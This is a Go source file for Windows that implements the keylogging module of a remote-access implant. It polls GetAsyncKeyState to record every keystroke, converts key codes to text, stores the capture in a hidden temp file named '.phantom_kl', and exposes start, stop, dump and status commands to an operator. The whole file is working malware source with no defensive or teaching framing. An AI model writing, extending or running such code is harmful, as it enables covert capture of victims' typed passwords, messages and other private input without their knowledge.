//go:build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"syscall"
	"time"
)

// The capture is kept in a file as well as memory, so a dump still works after
// the implant restarts and the buffer never grows without bound.
var (
	klMu   sync.Mutex
	klOn   bool
	klPrev [256]bool
	klFile = filepath.Join(os.TempDir(), ".phantom_kl")
)

const (
	klMax  = 512 * 1024
	klTail = 256 * 1024
)

var (
	user32      = syscall.NewLazyDLL("user32.dll")
	procAsyncKs = user32.NewProc("GetAsyncKeyState")
)

func keylogStart(dev string) Result {
	klMu.Lock()
	if klOn {
		klMu.Unlock()
		return Result{OK: true, Out: "already running"}
	}
	klOn = true
	klPrev = [256]bool{}
	klMu.Unlock()
	if f, err := os.OpenFile(klFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600); err == nil {
		f.Close()
	}
	go klPoll()
	return Result{OK: true, Out: "keylogging (GetAsyncKeyState)"}
}

func keylogStop() Result {
	klMu.Lock()
	klOn = false
	klMu.Unlock()
	// flush whatever the buffer holds into the archive so nothing is lost
	out := klTake()
	if out != "" {
		return Result{OK: true, Out: out}
	}
	return Result{OK: true, Out: "stopped"}
}

func keylogDump(clear bool) Result {
	out := klTake()
	if clear {
		klMu.Lock()
		os.Truncate(klFile, 0)
		klMu.Unlock()
	}
	if out == "" {
		return Result{OK: true, Out: "(empty)"}
	}
	return Result{OK: true, Out: out}
}

func keylogStatus() Result {
	klMu.Lock()
	on := klOn
	klMu.Unlock()
	size := int64(0)
	if info, err := os.Stat(klFile); err == nil {
		size = info.Size()
	}
	state := "stopped"
	if on {
		state = "running"
	}
	return Result{OK: true, Out: fmt.Sprintf("%s · device=GetAsyncKeyState buffer=%dB", state, size)}
}

// klTake hands over the captured text and clears the live buffer.
func klTake() string {
	klMu.Lock()
	defer klMu.Unlock()
	b, err := os.ReadFile(klFile)
	if err != nil {
		return ""
	}
	os.Truncate(klFile, 0)
	return string(b)
}

func klPoll() {
	for {
		klMu.Lock()
		on := klOn
		klMu.Unlock()
		if !on {
			return
		}
		shift := down(16) || down(160)
		caps := down(20)
		for vk := 8; vk < 256; vk++ {
			pressed := down(vk)
			if pressed && !klPrev[vk] {
				klPrev[vk] = true
				if ch := vkToChar(vk, shift, caps); ch != "" {
					klAppend(ch)
				}
			} else if !pressed && klPrev[vk] {
				klPrev[vk] = false
			}
		}
		time.Sleep(8 * time.Millisecond)
	}
}

func down(vk int) bool {
	r, _, _ := procAsyncKs.Call(uintptr(vk))
	return r&0x8000 != 0
}

func vkToChar(vk int, shift, caps bool) string {
	if vk >= 0x41 && vk <= 0x5A { // A-Z
		if shift != caps {
			return string(byte(vk))
		}
		return string(byte(vk) + 32)
	}
	if vk >= 0x30 && vk <= 0x39 { // 0-9
		base := "0123456789"
		shifted := ")!@#$%^&*("
		if shift {
			return string(shifted[vk-0x30])
		}
		return string(base[vk-0x30])
	}
	switch vk {
	case 0x08:
		return "\b"
	case 0x09:
		return "\t"
	case 0x0D:
		return "\n"
	case 0x20:
		return " "
	case 0xBA:
		if shift {
			return ":"
		}
		return ";"
	case 0xBB:
		if shift {
			return "+"
		}
		return "="
	case 0xBC:
		if shift {
			return "<"
		}
		return ","
	case 0xBD:
		if shift {
			return "_"
		}
		return "-"
	case 0xBE:
		if shift {
			return ">"
		}
		return "."
	case 0xBF:
		if shift {
			return "?"
		}
		return "/"
	case 0xC0:
		if shift {
			return "~"
		}
		return "`"
	case 0xDB:
		if shift {
			return "{"
		}
		return "["
	case 0xDC:
		if shift {
			return "|"
		}
		return "\\"
	case 0xDD:
		if shift {
			return "}"
		}
		return "]"
	case 0xDE:
		if shift {
			return `"`
		}
		return "'"
	}
	return ""
}

func klAppend(s string) {
	klMu.Lock()
	defer klMu.Unlock()
	f, err := os.OpenFile(klFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(s)
	if info, err := f.Stat(); err == nil && info.Size() > klMax {
		klTrimLocked()
	}
}

// klTrimLocked keeps the newest klTail bytes. Caller holds klMu.
func klTrimLocked() {
	b, err := os.ReadFile(klFile)
	if err != nil || len(b) <= klTail {
		return
	}
	os.WriteFile(klFile, b[len(b)-klTail:], 0600)
}